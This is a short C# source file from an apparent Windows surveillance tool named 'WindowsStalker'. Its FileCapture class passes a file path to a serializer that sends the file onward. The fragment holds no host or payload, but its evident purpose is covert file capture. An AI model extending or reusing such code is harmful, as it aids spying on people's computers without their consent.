namespace WindowsStalker
{
    public class FileCapture
    {
        public static void SendFile(string path, byte datatype)
        {
            Serializer serializer = new Serializer();
            serializer.SendFile(path, datatype);
        }
    }
}